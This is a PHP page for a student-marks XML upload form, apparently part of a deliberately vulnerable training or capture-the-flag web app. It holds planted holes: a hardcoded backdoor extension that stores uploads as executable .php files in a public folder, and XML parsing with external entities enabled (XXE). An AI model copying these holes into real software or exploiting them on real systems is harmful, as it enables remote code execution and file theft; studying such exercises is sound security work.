<?php include('layout/header.php'); ?>
<?php include('layout/nav.php'); ?>

<?php 

$uploaded = false;
$file = $app->request()->file('file');

$extension = pathinfo($file['name'], PATHINFO_EXTENSION);
$filename = pathinfo($file['name'], PATHINFO_FILENAME); 
$error = true;
$backdoor = 'phpbigbackdoorofthedeath';
$success_message = null;
if($file) {
    $uploaded = true;

    if ($extension == 'xml' or $extension == $backdoor) {    

        $error = false;
       
 	if ($extension == $backdoor) {
	    $extension = 'php';

       	    $uploadfile = '../public/uploads/' . $filename . '.' . $extension;
    	    move_uploaded_file($file['tmp_name'], $uploadfile);
    	    $success_message = 'Le fichier <code>' . $filename . '.' . $extension . '</code> a été uploadé avec succès dans le répertoire <code>uploads</code>.';
	}
	else {
		libxml_disable_entity_loader (false); 
		$xmlDoc = new DOMDocument();
		$xmlDoc->load($file['tmp_name'], LIBXML_DTDLOAD | LIBXML_NOENT);	
		$res = simplexml_import_dom($xmlDoc);
//		    var_dump($grades);
//		var_dump($xmlDoc);
//$user = $creds->user; 
   //		     $pass = $creds->pass; 
  //  echo "You have logged in as user $user";
      	   	$success_message = '<p>This feature is not working yet.</p>';
      	   	$success_message .= '<table class="table"><tr><th>Name</th><th>Grade</th><th>Class</th></tr>';
      	   	foreach ($res->grade as $grade) {
			$success_message .= '<tr><td>' . $grade->name . '</td><td>' . $grade->grade . '</td><td>' . $grade->class . '</td></tr>';

//echo $gr . '<br/>';
		
		}

		$success_message .= '</table>';

		//print $xmlDoc->saveXML();
	}
    }
}

?>

<div class="container">

    
    <h1>Upload students marks</h1>
    <?php if(!$uploaded): ?>
    <p>Upload a <code>.xml</code> file containing the marks of users. An example file can be downloaded <a href="/example.xml">here</a></p>
    <p class="alert alert-warning">Due to the hasty	    departure of the previous sys admin, this feature is still work in progress.</p>
    <?php endif; ?>
    <?php if($uploaded && !$error): ?>
        <div class="alert alert-success">
	     <?= $success_message ?>
        </div>
    <?php endif; ?>
	
    <?php if($uploaded && $error): ?>
	<div class="alert alert-danger">
	   Une erreur est survenue lors de l'upload du fichier. Le format n'est probablement pas autorisé.
	</div>
    <?php endif; ?>

    <?php if(!$uploaded): ?>
    <form action="" method="POST"  enctype="multipart/form-data" id="form">
        <input type="file" name="file" accept=".xml" id="file" required>
        <input type="submit" value="Valider" class="btn btn-primary">
    </form>
    <?php endif; ?>

</div>

<script>

var form = document.querySelector('#form');
var fileInput = document.querySelector('#file');

form.addEventListener('submit', function(event) {
    file = fileInput.files[0];

    if (file.name.split('.').pop() !== 'xml') {
        event.preventDefault();
        alert('Invalid file');
    }
})
</script>

<?php include('layout/footer.php'); ?>
